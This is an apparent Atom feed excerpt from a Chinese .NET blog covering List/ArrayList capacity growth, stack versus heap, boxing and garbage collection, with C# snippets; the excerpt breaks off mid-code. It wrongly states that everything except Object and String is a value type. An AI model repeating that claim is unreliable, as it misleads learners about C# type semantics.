&lt;h2 id=&quot;集合如何实现动态扩容&quot;&gt;&lt;a href=&quot;#集合如何实现动态扩容&quot; class=&quot;headerlink&quot; title=&quot;集合如何实现动态扩容&quot;&gt;&lt;/a&gt;集合如何实现动态扩容&lt;/h2&gt;&lt;p&gt;拿ArrayList和List为例,实际的代码大概如下:&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; 增加元素&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Add&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//超出集合大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size == &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.EnsureCapacity(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items[&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size] = &lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._version++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; 设置容量大小 默认容量为4,超出容量则扩容2倍&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;EnsureCapacity&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; min&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length &amp;lt; min)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    	&lt;span class=&quot;comment&quot;&gt;//默认容量为4,超出容量则扩容2倍&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; num = (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) ? &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt; : (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length * &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (num &amp;lt; min)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            num = min;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.Capacity = num;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; 设置容量大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&lt;span class=&quot;doctag&quot;&gt;///&lt;/span&gt; &lt;span class=&quot;doctag&quot;&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;virtual&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; Capacity&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;get&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;set&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; != &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items.Length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &amp;lt; &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ArgumentOutOfRangeException(&lt;span class=&quot;string&quot;&gt;&quot;value&quot;&lt;/span&gt;, Environment.GetResourceString(&lt;span class=&quot;string&quot;&gt;&quot;ArgumentOutOfRange_SmallCapacity&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt; &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;[] array = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;[&lt;span class=&quot;keyword&quot;&gt;value&lt;/span&gt;];&lt;span class=&quot;comment&quot;&gt;//重新分配内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    Array.Copy(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, array, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._size); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items = array;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;._items = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt;[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;测试&lt;/p&gt;
&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;List&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt; list = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; List&amp;lt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;&amp;gt;();&lt;span class=&quot;comment&quot;&gt;//list.Capacity=0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;list.Add(&lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;());&lt;span class=&quot;comment&quot;&gt;//list.Capacity=8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;总结&quot;&gt;&lt;a href=&quot;#总结&quot; class=&quot;headerlink&quot; title=&quot;总结&quot;&gt;&lt;/a&gt;总结&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;无论是List,ArrayList或其它集合,不过是对Array的一层包装,也由此可以断定集合的性能肯定不如Array。&lt;/li&gt;
&lt;li&gt;集合的扩容过程增加CPU的损耗和GC的压力，对于问题的严重性就取决于实际应用的场合，如果在高并发的应用下存在大量这操作那问题就变得严重多了。&lt;/li&gt;
&lt;li&gt;使用:对集合初始化的时候指定容量,如果可以直接使用Array代替集合。&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的&lt;/p&gt;
&lt;h2 id=&quot;数组与集合&quot;&gt;&lt;a href=&quot;#数组与集合&quot; class=&quot;headerlink&quot; title=&quot;数组与集合&quot;&gt;&lt;/a&gt;数组与集合&lt;/h2&gt;&lt;p&gt;大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>.net由内存模型说性能1</title>
    <link href="http://binyanbin.github.io/2016/04/30/CSharp-1/"/>
    <id>http://binyanbin.github.io/2016/04/30/CSharp-1/</id>
    <published>2016-04-29T16:00:00.000Z</published>
    <updated>2016-06-15T15:52:46.000Z</updated>
    
    <content type="html">&lt;p&gt;.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。&lt;/p&gt;
&lt;h2 id=&quot;内存模型-堆与栈&quot;&gt;&lt;a href=&quot;#内存模型-堆与栈&quot; class=&quot;headerlink&quot; title=&quot;内存模型:堆与栈&quot;&gt;&lt;/a&gt;内存模型:堆与栈&lt;/h2&gt;&lt;p&gt;C#内存主要有两类：Stack和Heap&lt;br&gt;Stack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。&lt;br&gt;Heap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。&lt;br&gt;&lt;img src=&quot;/img/CSharp-1.jpg&quot; alt=&quot;效果&quot;&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;值类型与引用类型&quot;&gt;&lt;a href=&quot;#值类型与引用类型&quot; class=&quot;headerlink&quot; title=&quot;值类型与引用类型&quot;&gt;&lt;/a&gt;值类型与引用类型&lt;/h2&gt;&lt;p&gt;值类型的数据和内存在同一个位置，而引用类型是一个指向内存的指针。也就是对Stack和Heap的实际使用。&lt;br&gt;&lt;img src=&quot;/img/CSharp-2.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-3.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;除了Object和String,其它都是值类型。值类型的性能要略优于引用类型，它只需要一次访问内存就可拿到数据。&lt;/p&gt;
&lt;h2 id=&quot;装箱与拆箱&quot;&gt;&lt;a href=&quot;#装箱与拆箱&quot; class=&quot;headerlink&quot; title=&quot;装箱与拆箱&quot;&gt;&lt;/a&gt;装箱与拆箱&lt;/h2&gt;&lt;p&gt;值类型与引用类型进行类型转换时会产生装箱和拆箱操作。&lt;br&gt;&lt;img src=&quot;/img/CSharp-4.jpg&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;非必要时尽量避免这类操作，会对性能一定的影响。&lt;/p&gt;
&lt;h2 id=&quot;垃圾回收器GC&quot;&gt;&lt;a href=&quot;#垃圾回收器GC&quot; class=&quot;headerlink&quot; title=&quot;垃圾回收器GC&quot;&gt;&lt;/a&gt;垃圾回收器GC&lt;/h2&gt;&lt;p&gt;垃圾回收器为什么不会立即回收对象?&lt;br&gt;对象不再被引用时,如果立即删除,堆上的自由空间就会分散开来，给新对象分配内存就会很难处理,程序必须搜索整个堆才能找到一块足够大的内存块来存储整个新对象。&lt;br&gt;整个heap中对象的引用关系错综复杂（交叉引用、循环引用），形成复杂的graph。heap对应有一个Roots，它能使程序在heap之外可以找到的各种入口点。root包括:全局对象、静态变量、局部对象、函数调用参数、当前CPU寄存器中的对象指针。&lt;br&gt;下面可以通过一组图片来进一步了解GC的工作。黄色代表还在引用的对象，灰色代表没有引用的对象。&lt;br&gt;现在内存使用已达到阀值,GC需要清理内存，下图就是GC整个清理的过程。&lt;br&gt;&lt;img src=&quot;/img/CSharp-5.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-6.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-7.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;&lt;img src=&quot;/img/CSharp-8.gif&quot; alt=&quot;效果&quot;&gt;&lt;br&gt;GC回收内存是一种非常耗费性能的工作，减少不必要的内存使用有助于提高GC性能&lt;/p&gt;
&lt;h2 id=&quot;传参的优化&quot;&gt;&lt;a href=&quot;#传参的优化&quot; class=&quot;headerlink&quot; title=&quot;传参的优化&quot;&gt;&lt;/a&gt;传参的优化&lt;/h2&gt;&lt;p&gt;如果我们要将一个非常大的值类型数据(如数据量大的struct类型)入栈，它会占用非常大的内存空间，而且会占有过多的处理器资源来进行拷贝复制。&lt;br&gt;&lt;figure class=&quot;highlight csharp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ConstNum&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; a,b,c,d,e,f,g,h,i,j,k;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;  &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Go&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ConstNum x = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; ConstNum();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	Do(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;  &lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Do&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;ConstNum x&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span 